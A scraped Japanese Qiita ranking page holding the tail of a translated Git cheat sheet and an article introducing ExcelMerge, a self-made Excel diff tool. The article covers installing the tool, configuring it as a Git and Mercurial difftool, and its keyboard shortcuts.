<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span># git reset "[commit id]" 
[commit]の後にすべてのコミットを元に戻し、ローカルに変更を保存します

# git reset --hard "[commit id]"
すべての履歴と変更を破棄します
</pre></div></div>

<h2>
<span id="変更をリモートリポジトリと同期する" class="fragment"></span><a href="#%E5%A4%89%E6%9B%B4%E3%82%92%E3%83%AA%E3%83%A2%E3%83%BC%E3%83%88%E3%83%AA%E3%83%9D%E3%82%B8%E3%83%88%E3%83%AA%E3%81%A8%E5%90%8C%E6%9C%9F%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>変更をリモートリポジトリと同期する</h2>

<p>変更をリモートリポジトリから取得したり、リモートにあげたりする</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>$ git fetch "[origin]"
リモートリポジトリからすべての履歴をダウンロードする

$ git merge "[origin]"/"[branch]"
リモートリポジトリのブランチを現在のローカルブランチに結合する

$ git push "[origin]" "[branch]"
ブランチをすべてアップロードするローカルブランチはGitHubにコミットする

$ git pull
リモートリポジトリの履歴をダウンロードし、変更を組み込む
</pre></div></div>

<h2>
<span id="githubトレーニング" class="fragment"></span><a href="#github%E3%83%88%E3%83%AC%E3%83%BC%E3%83%8B%E3%83%B3%E3%82%B0"><i class="fa fa-link"></i></a>GitHubトレーニング</h2>

<p>GitHubとGitを使用する方法の詳細を学ぶトレーニングチームにメールを送信するか、イベントスケジュールとプライベートクラスの可用性を学ぶためにWebサイトを訪れてください</p>

<p>mail: <a href="mailto:training@github.com" class="autolink">training@github.com</a><br>
web:  training.github.com</p>

<h2>
<span id="まとめ" class="fragment"></span><a href="#%E3%81%BE%E3%81%A8%E3%82%81"><i class="fa fa-link"></i></a>まとめ</h2>

<p>初めて翻訳系の記事を書きました。<br>
これだけの量で結構時間がかかってしまいました。</p>

<p>個人的に知らなかったのが <code>git ls-files --other --ignored --exclude-standard</code> ぐらいでした！</p>

<p>今後の勉強の為にもまた翻訳系チャレンジします</p>

<h2>
<span id="参考先" class="fragment"></span><a href="#%E5%8F%82%E8%80%83%E5%85%88"><i class="fa fa-link"></i></a>参考先</h2>

<ul>
<li><a href="https://services.github.com/on-demand/downloads/github-git-cheat-sheet.pdf" rel="nofollow noopener" target="_blank">github-git-cheat-sheet</a></li>
</ul>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">40位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>244</kbd>
		<a target="_blank" href="https://qiita.com/skanmera/items/d1dea61a7077f320524e">Excelファイルを比較するツールを作ってみた</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-10-29<br />19:04:20</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/206881.html">skanmera</a>(2件の記事)<br><img width="80" height="80" src="https://secure.gravatar.com/avatar/f5d819f88c168f60a31758ce87cda455">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[Git]</b> <b>[C#]</b> <b>[Mercurial]</b> <b>[Excel]</b> <b>[diff]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><p><a href="https://camo.qiitausercontent.com/28bef8fc1314490664ac7a1af9fece42c52da46e/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3230363838312f38646464636164302d353136652d616538622d366666302d6162383538393534376534332e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/28bef8fc1314490664ac7a1af9fece42c52da46e/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3230363838312f38646464636164302d353136652d616538622d366666302d6162383538393534376534332e706e67" alt="" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/206881/8dddcad0-516e-ae8b-6ff0-ab8589547e43.png"></a></p>

<h1>
<span id="はじめに" class="fragment"></span><a href="#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB"><i class="fa fa-link"></i></a>はじめに</h1>

<p>Excelファイルの比較には<strong><em>WinMerge</em></strong>に<strong><em>xdocdiff</em></strong>のプラグインを入れて使っていたのですが、<br>
列が揃ってなかったり、ヘッダを固定できなかったりと少し不便に感じていました。<br>
そんなわけでExcelファイルを比較するツールを自作してみたので、紹介と使い方を書いていこうと思います。</p>

<h1>
<span id="注意" class="fragment"></span><a href="#%E6%B3%A8%E6%84%8F"><i class="fa fa-link"></i></a>注意</h1>

<p>このツールは筆者の仕事環境において必要最低限の要件で作成しています</p>

<h1>
<span id="インストール" class="fragment"></span><a href="#%E3%82%A4%E3%83%B3%E3%82%B9%E3%83%88%E3%83%BC%E3%83%AB"><i class="fa fa-link"></i></a>インストール</h1>

<h3>
<span id="ここ-から最新のmsiをダウンロードする" class="fragment"></span><a href="#%E3%81%93%E3%81%93-%E3%81%8B%E3%82%89%E6%9C%80%E6%96%B0%E3%81%AEmsi%E3%82%92%E3%83%80%E3%82%A6%E3%83%B3%E3%83%AD%E3%83%BC%E3%83%89%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a><a href="https://github.com/skanmera/ExcelMerge/releases" rel="nofollow noopener" target="_blank">ここ</a> から最新の.msiをダウンロードする</h3>

<p><a href="https://camo.qiitausercontent.com/aa0de83068737cdbdb243016b8ecc8ed29a5c4f5/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3230363838312f62376336306633642d643433652d396533642d646563322d3333653464633632323162382e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/aa0de83068737cdbdb243016b8ecc8ed29a5c4f5/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3230363838312f62376336306633642d643433652d396533642d646563322d3333653464633632323162382e706e67" alt="SnapCrab_NoName_2017-10-29_16-4-52_No-00.png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/206881/b7c60f3d-d43e-9e3d-dec2-33e4dc6221b8.png"></a></p>

<h3>
<span id="ダウンロードしてインストーラーを実行する" class="fragment"></span><a href="#%E3%83%80%E3%82%A6%E3%83%B3%E3%83%AD%E3%83%BC%E3%83%89%E3%81%97%E3%81%A6%E3%82%A4%E3%83%B3%E3%82%B9%E3%83%88%E3%83%BC%E3%83%A9%E3%83%BC%E3%82%92%E5%AE%9F%E8%A1%8C%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>ダウンロードしてインストーラーを実行する</h3>

<p>※電子署名をしていないので、以下のウィンドウが表示されると思います。「詳細」→「実行」で実行できます。</p>

<p><a href="https://camo.qiitausercontent.com/3320a049a83e33fdfc62dee42c1572bc49451b19/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3230363838312f39323134333666632d356162342d373266612d333366632d3161346661353661353339302e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/3320a049a83e33fdfc62dee42c1572bc49451b19/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3230363838312f39323134333666632d356162342d373266612d333366632d3161346661353661353339302e706e67" alt="" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/206881/921436fc-5ab4-72fa-33fc-1a4fa56a5390.png"></a></p>

<p><a href="https://camo.qiitausercontent.com/2890793ef5b3d7eacf81fb760a5a9231865b8918/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3230363838312f65636336313031622d633734622d663864312d373736382d6163633732323731343761372e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/2890793ef5b3d7eacf81fb760a5a9231865b8918/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3230363838312f65636336313031622d633734622d663864312d373736382d6163633732323731343761372e706e67" alt="" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/206881/ecc6101b-c74b-f8d1-7768-acc7227147a7.png"></a></p>

<h3>
<span id="nextを選択" class="fragment"></span><a href="#next%E3%82%92%E9%81%B8%E6%8A%9E"><i class="fa fa-link"></i></a>Nextを選択</h3>

<p><a href="https://camo.qiitausercontent.com/7e3679d5a265302d52ec6864eb02f84bee6b9d6a/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3230363838312f63373566613734342d383433352d626133622d666233642d3466643765376639653830372e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/7e3679d5a265302d52ec6864eb02f84bee6b9d6a/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3230363838312f63373566613734342d383433352d626133622d666233642d3466643765376639653830372e706e67" alt="" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/206881/c75fa744-8435-ba3b-fb3d-4fd7e7f9e807.png"></a> </p>

<h3>
<span id="インストールするディレクトリとユーザーを選択-特に指定がなければそのままnext" class="fragment"></span><a href="#%E3%82%A4%E3%83%B3%E3%82%B9%E3%83%88%E3%83%BC%E3%83%AB%E3%81%99%E3%82%8B%E3%83%87%E3%82%A3%E3%83%AC%E3%82%AF%E3%83%88%E3%83%AA%E3%81%A8%E3%83%A6%E3%83%BC%E3%82%B6%E3%83%BC%E3%82%92%E9%81%B8%E6%8A%9E-%E7%89%B9%E3%81%AB%E6%8C%87%E5%AE%9A%E3%81%8C%E3%81%AA%E3%81%91%E3%82%8C%E3%81%B0%E3%81%9D%E3%81%AE%E3%81%BE%E3%81%BEnext"><i class="fa fa-link"></i></a>インストールするディレクトリと、ユーザーを選択 (特に指定がなければそのままNext)</h3>

<p><a href="https://camo.qiitausercontent.com/4334e7a3da8983f3b32b19f9e9cdb945b6da4676/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3230363838312f39623038373464372d323564642d303034322d663966362d3334353730363836366437342e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/4334e7a3da8983f3b32b19f9e9cdb945b6da4676/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3230363838312f39623038373464372d323564642d303034322d663966362d3334353730363836366437342e706e67" alt="" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/206881/9b0874d7-25dd-0042-f9f6-345706866d74.png"></a></p>

<h3>
<span id="nextを選択-1" class="fragment"></span><a href="#next%E3%82%92%E9%81%B8%E6%8A%9E-1"><i class="fa fa-link"></i></a>Nextを選択</h3>

<p><a href="https://camo.qiitausercontent.com/65ac884f4f01acefc5043815cc235e854a296c53/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3230363838312f31343563313932312d363139342d313964312d623361372d3962333238663739386534392e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/65ac884f4f01acefc5043815cc235e854a296c53/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3230363838312f31343563313932312d363139342d313964312d623361372d3962333238663739386534392e706e67" alt="" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/206881/145c1921-6194-19d1-b3a7-9b328f798e49.png"></a></p>

<h1>
<span id="起動方法" class="fragment"></span><a href="#%E8%B5%B7%E5%8B%95%E6%96%B9%E6%B3%95"><i class="fa fa-link"></i></a>起動方法</h1>

<h3>
<span id="ショートカットアイコン" class="fragment"></span><a href="#%E3%82%B7%E3%83%A7%E3%83%BC%E3%83%88%E3%82%AB%E3%83%83%E3%83%88%E3%82%A2%E3%82%A4%E3%82%B3%E3%83%B3"><i class="fa fa-link"></i></a>　ショートカットアイコン</h3>

<p>インストールが完了すると、デスクトップにショートカットアイコンが作成されるので、起動して上部メニューの「ファイル」から比較するファイルを選択する</p>

<p><a href="https://camo.qiitausercontent.com/a45727e879f0ed027dad9661810a1d8b23092d49/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3230363838312f64643832626465632d393164642d613664652d376261382d6634643133376163323262652e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/a45727e879f0ed027dad9661810a1d8b23092d49/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3230363838312f64643832626465632d393164642d613664652d376261382d6634643133376163323262652e706e67" alt="" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/206881/dd82bdec-91dd-a6de-7ba8-f4d137ac22be.png"></a></p>

<h3>
<span id="エクスプローラのコンテキストメニュー" class="fragment"></span><a href="#%E3%82%A8%E3%82%AF%E3%82%B9%E3%83%97%E3%83%AD%E3%83%BC%E3%83%A9%E3%81%AE%E3%82%B3%E3%83%B3%E3%83%86%E3%82%AD%E3%82%B9%E3%83%88%E3%83%A1%E3%83%8B%E3%83%A5%E3%83%BC"><i class="fa fa-link"></i></a>エクスプローラのコンテキストメニュー</h3>

<p>エクスプローラでファイルを選択した状態でコンテキストメニューを開き、ExcelMergeを選択する</p>

<p><a href="https://camo.qiitausercontent.com/81cdcb82a4e6e864ee6a981315f462f3019c3306/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3230363838312f61313130616563612d356565382d346630642d396530382d3133333534326131323462632e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/81cdcb82a4e6e864ee6a981315f462f3019c3306/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3230363838312f61313130616563612d356565382d346630642d396530382d3133333534326131323462632e706e67" alt="" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/206881/a110aeca-5ee8-4f0d-9e08-133542a124bc.png"></a></p>

<h3>
<span id="コマンドライン" class="fragment"></span><a href="#%E3%82%B3%E3%83%9E%E3%83%B3%E3%83%89%E3%83%A9%E3%82%A4%E3%83%B3"><i class="fa fa-link"></i></a>コマンドライン</h3>

<p>コマンドラインからオプションを指定して起動することもできます<br>
オプションに関しては <a href="https://github.com/skanmera/ExcelMerge#from-command-line" rel="nofollow noopener" target="_blank">README</a> を参照してください</p>

<h1>
<span id="使い方" class="fragment"></span><a href="#%E4%BD%BF%E3%81%84%E6%96%B9"><i class="fa fa-link"></i></a>使い方</h1>

<h2>
<span id="差分を抽出する" class="fragment"></span><a href="#%E5%B7%AE%E5%88%86%E3%82%92%E6%8A%BD%E5%87%BA%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>差分を抽出する</h2>

<p>ファイルを選択している状態で「差分抽出」を実行することで選択中のシートの比較結果が表示されます。</p>

<p><a href="https://camo.qiitausercontent.com/a313ddd763bf6f9b89e5de4b5c3ea2f39f99ce68/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3230363838312f63666263306434642d636534642d336637612d663333622d3632316666383763306132622e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/a313ddd763bf6f9b89e5de4b5c3ea2f39f99ce68/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3230363838312f63666263306434642d636534642d336637612d663333622d3632316666383763306132622e706e67" alt="" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/206881/cfbc0d4d-ce4d-3f7a-f33b-621ff87c0a2b.png"></a></p>

<p>コンテキストメニューやコマンドラインから起動した場合、差分が抽出可能であれば自動で抽出されます。</p>

<h2>
<span id="列ヘッダ行ヘッダを変更する" class="fragment"></span><a href="#%E5%88%97%E3%83%98%E3%83%83%E3%83%80%E8%A1%8C%E3%83%98%E3%83%83%E3%83%80%E3%82%92%E5%A4%89%E6%9B%B4%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>列ヘッダ、行ヘッダを変更する</h2>

<p>デフォルトで列ヘッダは0行目の内容が、行ヘッダは行のインデックスが表示されます。<br>
変更するには変更したい行、または列の任意のセルを選択した状態でコンテキストメニューを開き「列ヘッダに設定」または「行ヘッダに設定」を選択します</p>

<p>デフォルトで表示されている行インデックスから「氏名」に変更する場合<br>
<a href="https://camo.qiitausercontent.com/d4a82776f1c110a4b2f4cfbab0894c9870a1fce7/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3230363838312f35343962356135652d383664342d353339342d633233362d3737636631623033383636632e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/d4a82776f1c110a4b2f4cfbab0894c9870a1fce7/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3230363838312f35343962356135652d383664342d353339342d633233362d3737636631623033383636632e706e67" alt="" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/206881/549b5a5e-86d4-5394-c236-77cf1b03866c.png"></a></p>

<p><a href="https://camo.qiitausercontent.com/b265bfca8967084075d555818f7a6472c54a97c1/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3230363838312f36316666383166612d396232362d363530642d366432652d3266353738373830656464652e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/b265bfca8967084075d555818f7a6472c54a97c1/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3230363838312f36316666383166612d396232362d363530642d366432652d3266353738373830656464652e706e67" alt="" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/206881/61ff81fa-9b26-650d-6d2e-2f578780edde.png"></a></p>

<p><a href="https://camo.qiitausercontent.com/8f520a94adcdf953509cab61e5088efdd6aef828/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3230363838312f35353238383336662d366665382d383934652d623038382d3266313265393433393264382e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/8f520a94adcdf953509cab61e5088efdd6aef828/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3230363838312f35353238383336662d366665382d383934652d623038382d3266313265393433393264382e706e67" alt="" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/206881/5528836f-6fe8-894e-b088-2f12e94392d8.png"></a></p>

<h2>
<span id="ファイルごとに設定を作成する" class="fragment"></span><a href="#%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%81%94%E3%81%A8%E3%81%AB%E8%A8%AD%E5%AE%9A%E3%82%92%E4%BD%9C%E6%88%90%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>ファイルごとに設定を作成する</h2>

<p>毎回列ヘッダや行ヘッダを設定するのは面倒なので、事前にファイルごとに設定を行います<br>
上部メニューの「設定」から「ファイル設定」を選択し、追加ボタンを選択します</p>

<p><a href="https://camo.qiitausercontent.com/168ce538e3624f1078d6eb80d0f2cb4238706311/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3230363838312f36383861373231352d613761642d613237352d623931322d3235343162356632396632352e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/168ce538e3624f1078d6eb80d0f2cb4238706311/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3230363838312f36383861373231352d613761642d613237352d623931322d3235343162356632396632352e706e67" alt="" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/206881/688a7215-a7ad-a275-b912-2541b5f29f25.png"></a></p>

<p>設定を追加します<br>
<a href="https://camo.qiitausercontent.com/d70c1bd77b59e0875bd4251fad7291982d690c43/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3230363838312f31333039343163392d656530632d633461622d323161632d3831326530636465363562302e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/d70c1bd77b59e0875bd4251fad7291982d690c43/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3230363838312f31333039343163392d656530632d633461622d323161632d3831326530636465363562302e706e67" alt="" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/206881/130941c9-ee0c-c4ab-21ac-812e0cde65b0.png"></a></p>

<ul>
<li>「名前」はファイル名か正規表現で記述します</li>
<li>「行ヘッダインデックス」は-1で行インデックスが表示されます</li>
<li>「行ヘッダ」名は「行ヘッダインデックス」が指定しにくい場合などに、列ヘッダの名前で指定します。※同じ列ヘッダ名が複数存在するときは最初に一致したものを表示します</li>
<li>ファイル名を指定した場合は完全一致をチェックします</li>
</ul>

<h2>
<span id="バージョン管理ツールのdiffツールとして使用する" class="fragment"></span><a href="#%E3%83%90%E3%83%BC%E3%82%B8%E3%83%A7%E3%83%B3%E7%AE%A1%E7%90%86%E3%83%84%E3%83%BC%E3%83%AB%E3%81%AEdiff%E3%83%84%E3%83%BC%E3%83%AB%E3%81%A8%E3%81%97%E3%81%A6%E4%BD%BF%E7%94%A8%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>バージョン管理ツールのDiffツールとして使用する</h2>

<h3>
<span id="外部ツールを登録する" class="fragment"></span><a href="#%E5%A4%96%E9%83%A8%E3%83%84%E3%83%BC%E3%83%AB%E3%82%92%E7%99%BB%E9%8C%B2%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>外部ツールを登録する</h3>

<p>バージョン管理ツールのDiffツールとして使用する場合、テキストファイルや画像ファイルなどは通常のDiffツールで開く必要があるので、<br>
サポート対象外のファイルの場合に起動する外部ツールを登録する必要があります。<br>
※ここではWinMergeを外部ツールとして登録します</p>

<p>上部メニューの「設定」から「外部コマンド」を選択し、追加ボタンを選択します</p>

<p><a href="https://camo.qiitausercontent.com/50a67dd249de5e049932c9d305f202d5f1fee443/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3230363838312f36626236343937302d393065332d366237392d376236332d6662316363353236353563372e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/50a67dd249de5e049932c9d305f202d5f1fee443/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3230363838312f36626236343937302d393065332d366237392d376236332d6662316363353236353563372e706e67" alt="" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/206881/6bb64970-90e3-6b79-7b63-fb1cc52655c7.png"></a></p>

<ul>
<li>「名前」はこのコマンドの名前を登録します。コマンドラインから起動する際に指定されます</li>
<li>「実行ファイル」は実行するexeなどのパスを指定します</li>
<li>「引数」には実行ファイルに渡す引数を指定します</li>
</ul>

<h4>
<span id="利用可能な変数" class="fragment"></span><a href="#%E5%88%A9%E7%94%A8%E5%8F%AF%E8%83%BD%E3%81%AA%E5%A4%89%E6%95%B0"><i class="fa fa-link"></i></a>利用可能な変数</h4>

<table>
<thead>
<tr>
<th>変数</th>
<th>説明</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>${SRC}</code></td>
<td>右側のファイルパス</td>
</tr>
<tr>
<td><code>${DST}</code></td>
<td>左側のファイルパス</td>
</tr>
</tbody>
</table>

<h3>
<span id="gitの外部ツールとして登録する" class="fragment"></span><a href="#git%E3%81%AE%E5%A4%96%E9%83%A8%E3%83%84%E3%83%BC%E3%83%AB%E3%81%A8%E3%81%97%E3%81%A6%E7%99%BB%E9%8C%B2%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>Gitの外部ツールとして登録する</h3>

<p>.gitconfigにdiffツールを追加します</p>

<div class="code-frame" data-lang="ini">
<div class="code-lang"><span class="bold">.gitconfig</span></div>
<div class="highlight"><pre><span></span><span class="k">[diff]</span>
<span class="na">tool</span> <span class="o">=</span> <span class="s">WinMerge</span>

<span class="k">[difftool "WinMerge"]</span>
<span class="na">cmd</span> <span class="o">=</span> <span class="s">\"C:/Project/Github/excelmerge/ExcelMerge.GUI/bin/Debug/ExcelMerge.GUI.exe\" diff -s \"$LOCAL\" -d \"$REMOTE\" -c WinMerge -i -w -v -k </span>
</pre></div>
</div>

<ul>
<li>-c で先ほど登録した外部ツール(WinMerge)を指定しています</li>
<li>-i で .xls .xlsx .csv　以外のファイルの場合はダイアログなしで外部ツールが起動するように指定しています</li>
<li>-v で拡張子のチェックをします (-v 指定がないと例外が発生→外部ツール起動 となります)</li>
<li>-w で外部ツールのプロセス終了を待つようにします (プロセスを待たないと一時ファイルが削除されるため)</li>
</ul>

<p>これでSourceTreeからも使用が可能になります<br>
<a href="https://camo.qiitausercontent.com/a6854b9d290584ca07adf871513a6fe14c42aab2/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3230363838312f30356432643933312d313562612d353762312d653465322d6366376264623864386332612e676966" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/a6854b9d290584ca07adf871513a6fe14c42aab2/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3230363838312f30356432643933312d313562612d353762312d653465322d6366376264623864386332612e676966" alt="" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/206881/05d2d931-15ba-57b1-e4e2-cf7bdb8d8c2a.gif"></a></p>

<h3>
<span id="mercurialの外部ツールとして登録する" class="fragment"></span><a href="#mercurial%E3%81%AE%E5%A4%96%E9%83%A8%E3%83%84%E3%83%BC%E3%83%AB%E3%81%A8%E3%81%97%E3%81%A6%E7%99%BB%E9%8C%B2%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>Mercurialの外部ツールとして登録する</h3>

<p>mercurial.iniにdiffツールを追加します</p>

<div class="code-frame" data-lang="ini">
<div class="code-lang"><span class="bold">mercurial.ini</span></div>
<div class="highlight"><pre><span></span><span class="k">[merge-tools]</span>
<span class="na">excelmerge.executable</span> <span class="o">=</span> <span class="s">C:\Program Files (x86)\ExcelMerge\ExcelMerge.GUI.exe</span>
<span class="na">excelmerge.diffargs</span> <span class="o">=</span> <span class="s">diff -s $parent1 -d $child -c WinMerge -i -w -v -e empty -k</span>

<span class="k">[tortoisehg]</span>
<span class="na">vdiff</span> <span class="o">=</span> <span class="s">excelmerge</span>

<span class="k">[extdiff]</span>
<span class="c1">#extdiffはコメントアウトする</span>
<span class="c1">#cmd.wmdiff = C:\Program Files\WinMerge\WinMergeU.exe</span>
<span class="c1">#opts.wmdiff = /r /e /x /ub</span>
</pre></div>
</div>

<p>Gitの場合とオプションはほぼ同じですが、追加、削除のステータスのファイルを比較するときにemptyというファイル名で空のファイル名が渡されるので<br>
-e で空のファイル名を指定しています</p>

<h3>
<span id="変更ログを出力する" class="fragment"></span><a href="#%E5%A4%89%E6%9B%B4%E3%83%AD%E3%82%B0%E3%82%92%E5%87%BA%E5%8A%9B%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>変更ログを出力する</h3>

<p>コミットログなどに記載する際に、変更点をログとして出力できます。<br>
変更点をログとして出力したいセルを範囲選択します。(全部の場合はCtrl + A)で全選択<br>
コンテキストメニューの「ログを出力」を選択します</p>

<p><a href="https://camo.qiitausercontent.com/9e854f0ea51949f22db398e34a07a1cb41007b65/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3230363838312f32363666356433612d373630312d333363662d626261322d3434323638373963356538392e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/9e854f0ea51949f22db398e34a07a1cb41007b65/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f3230363838312f32363666356433612d373630312d333363662d626261322d3434323638373963356538392e706e67" alt="" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/206881/266f5d3a-7601-33cf-bba2-4426879c5e89.png"></a></p>

<p>ログのフォーマットは「差分抽出設定」から変更可能です。</p>

<h2>
<span id="ショートカットキー" class="fragment"></span><a href="#%E3%82%B7%E3%83%A7%E3%83%BC%E3%83%88%E3%82%AB%E3%83%83%E3%83%88%E3%82%AD%E3%83%BC"><i class="fa fa-link"></i></a>ショートカットキー</h2>

<table>
<thead>
<tr>
<th>キー</th>
<th>説明</th>
</tr>
</thead>
<tbody>
<tr>
<td>Ctrl + →</td>
<td>次の変更されたセルに移動</td>
</tr>
<tr>
<td>Ctrl + ←</td>
<td>前の変更されたセルに移動</td>
</tr>
<tr>
<td>Ctrl + ↓</td>
<td>次の変更された行に移動</td>
</tr>
<tr>
<td>Ctrl + ↑</td>
<td>前の変更された行に移動</td>
</tr>
<tr>
<td>Ctrl + K</td>
<td>次の追加された行に移動</td>
</tr>
<tr>
<td>Ctrl + I</td>
<td>前の追加された行に移動</td>
</tr>
<tr>
<td>Ctrl + L</td>
<td>次の削除された行に移動</td>
</tr>
<tr>
<td>Ctrl + O</td>
<td>前の削除された行に移動</td>
</tr>
<tr>
<td>Ctrl + F</td>
<td>セルを検索</td>
</tr>
<tr>
<td>F9</td>
<td>次の検索結果に一致するセルに移動</td>
</tr>
<tr>
<td>F8</td>
<td>前の検索結果に一致するセルに移動</td>
</tr>
<tr>
<td>Ctrl + C</td>
<td>選択したセルをタブ区切りでコピー(エクセルへの貼り付け)</td>
</tr>
<tr>
<td>Ctrl + Shift + C</td>
<td>選択したセルをカンマ区切りでコピー</td>
</tr>
<tr>
<td>Ctrl + D</td>
<td>コンソールを表示(隠す)</td>
</tr>
<tr>
